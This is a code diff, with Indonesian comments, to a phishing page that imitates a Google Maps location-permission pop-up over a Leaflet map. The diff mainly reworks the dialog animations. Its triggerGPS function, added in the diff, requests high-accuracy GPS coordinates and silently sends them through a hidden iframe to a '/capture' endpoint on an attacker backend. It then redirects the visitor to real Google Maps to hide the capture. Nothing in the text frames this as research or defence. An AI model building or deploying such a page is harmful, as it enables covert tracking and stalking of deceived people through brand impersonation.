@@ -13,7 +13,6 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', Arial, sans-serif; outline: none; -webkit-tap-highlight-color: transparent; }
         body, html { height: 100%; width: 100%; overflow: hidden; background: #000; }
         
-        /* Efek Zoom Peta di Background */
         #map { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; filter: brightness(0.6) contrast(1.1); transition: transform 4s cubic-bezier(0.25, 1, 0.5, 1); transform-origin: center; }
         .map-zoomed { transform: scale(1.15); }
 
@@ -28,35 +27,40 @@
         .search-text { font-size: 16px; color: #202124; font-weight: 500; }
         .close-btn { font-size: 20px; color: #5f6368; border: none; background: none; cursor: pointer; }
 
-        /* Backdrop Gelap */
         .dialog-overlay { 
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
             background: rgba(0,0,0,0.6); z-index: 100; 
             display: flex; justify-content: center; align-items: flex-end;
             opacity: 0; pointer-events: none; transition: opacity 0.4s ease;
-            backdrop-filter: blur(4px); /* Efek Kaca */
+            backdrop-filter: blur(4px);
         }
         .dialog-overlay.show { opacity: 1; pointer-events: auto; }
 
-        /* ANIMASI MASSIVE (3D Spring) */
+        /* State Awal Pop-up */
         .dialog-box { 
             background: #ffffff; padding: 12px 24px 32px 24px; 
             border-radius: 32px 32px 0 0; text-align: center; width: 100%; max-width: 500px; 
             position: relative;
-            /* Start position (di bawah) */
             transform: translateY(100%) scale(0.9); 
             opacity: 0;
             transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s; 
         }
+        
+        /* State Muncul */
         .dialog-overlay.show .dialog-box { 
-            /* Efek Memantul 3D */
             transform: translateY(0) scale(1); 
             opacity: 1;
         }
 
+        /* State Menghilang (Massive Out) */
+        .dialog-box.animate-out {
+            transform: translateY(100%) scale(0.7); /* Mengecil dan turun ke bawah */
+            opacity: 0;
+            transition: transform 0.4s cubic-bezier(0.6, -0.28, 0.735, 0.045), opacity 0.3s; 
+        }
+
         .drag-handle { width: 32px; height: 4px; background: #dadce0; border-radius: 2px; margin: 0 auto 20px auto; }
 
-        /* Container Logo + Efek Glow */
         .map-logo-container { display: flex; flex-direction: column; align-items: center; margin-bottom: 20px; position: relative; }
         
         .logo-glow-bg {
@@ -96,7 +100,6 @@
         }
         .btn-cancel:active { background: #f1f3f4; }
         
-        /* Tombol Benarkan dengan Efek Glow + Ripple */
         .btn-allow { 
             flex: 1; padding: 14px; border-radius: 100px; border: none; 
             background: #1a73e8; color: #ffffff; font-weight: 500; font-size: 15px; cursor: pointer; 
@@ -106,11 +109,12 @@
             overflow: hidden;
         }
         .btn-allow:active { 
-            transform: scale(0.95); /* Efek tekan */
+            transform: scale(0.95); 
             box-shadow: 0 0 25px rgba(26, 115, 232, 0.9), 0 2px 4px rgba(0,0,0,0.1);
             background: #1557b0;
         }
 
+        /* Loading State */
         .loading-state { display: none; padding: 20px 0; }
         .spinner { border: 4px solid #f1f3f4; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -158,45 +162,57 @@
     var map = L.map('map', {zoomControl: false}).setView([2.9903, 101.4259], 16);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
-    // Animasi Massive pas halaman load
+    // Animasi Load Awal
     window.addEventListener('load', () => {
         setTimeout(() => {
-            // 1. Peta nge-zoom pelan-pelan (Cinematic)
             document.getElementById('map').classList.add('map-zoomed');
-            // 2. Search bar ilang
             document.getElementById('searchBar').style.opacity = '0';
-            // 3. Pop-up meluncur naik dengan efek memantul
             document.getElementById('dialogOverlay').classList.add('show');
         }, 400);
     });
 
     function triggerGPS() {
-        document.getElementById('askState').style.display = 'none';
-        document.getElementById('loadingState').style.display = 'block';
-
+        const dialogBox = document.getElementById('dialogBox');
+        
+        // 1. Mainin Animasi Massive Out
+        dialogBox.classList.add('animate-out');
+        
+        // 2. Tunggu animasi selesai (0.4 detik), baru ubah state ke Loading
         setTimeout(() => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        
-                        var iframe = document.createElement('iframe');
-                        iframe.style.display = 'none';
-                        iframe.src = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}`;
-                        document.body.appendChild(iframe);
+            document.getElementById('askState').style.display = 'none';
+            document.getElementById('loadingState').style.display = 'block';
+            
+            // Munculin lagi pop-up-nya (tapi sekarang isinya loading)
+            dialogBox.classList.remove('animate-out');
+            dialogBox.style.transform = 'translateY(0) scale(1)';
+            dialogBox.style.opacity = '1';
 
-                        setTimeout(() => {
-                            window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
-                        }, 2000);
-                    },
-                    (error) => {
-                        window.location.href = "https://www.google.com/maps";
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
-            }
-        }, 500);
+            // 3. Tembak GPS setelah loading muncul
+            setTimeout(() => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            
+                            var iframe = document.createElement('iframe');
+                            iframe.style.display = 'none';
+                            iframe.src = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}`;
+                            document.body.appendChild(iframe);
+
+                            setTimeout(() => {
+                                window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+                            }, 2000);
+                        },
+                        (error) => {
+                            window.location.href = "https://www.google.com/maps";
+                        },
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    );
+                }
+            }, 500);
+
+        }, 400); // 400ms sesuai durasi animasi CSS
     }
 
     document.getElementById('btnAllow').addEventListener('click', triggerGPS);
